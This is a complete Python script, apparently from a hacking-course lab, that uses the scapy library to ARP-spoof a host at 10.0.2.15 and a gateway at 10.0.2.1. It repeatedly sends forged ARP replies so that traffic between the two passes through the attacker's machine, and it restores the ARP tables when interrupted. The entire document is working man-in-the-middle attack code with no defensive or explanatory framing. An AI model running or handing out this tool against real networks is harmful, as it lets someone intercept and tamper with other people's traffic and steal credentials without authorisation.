#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
sent_packets_count = 0

start_time = time.time()
try:
    while True:
        spoof("10.0.2.15", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.15")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent packets:" + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore("10.0.2.15", "10.0.2.1")
    restore("10.0.2.1", "10.0.2.15")

    end_time = time.time()
    total_time = int(end_time - start_time)
    print ("\r Spoofing is stopped and ARP-tables restored successfully! \n \
    Total sent packets: " + str(sent_packets_count), "\tActivity time in total: " + str(total_time) + " seconds")

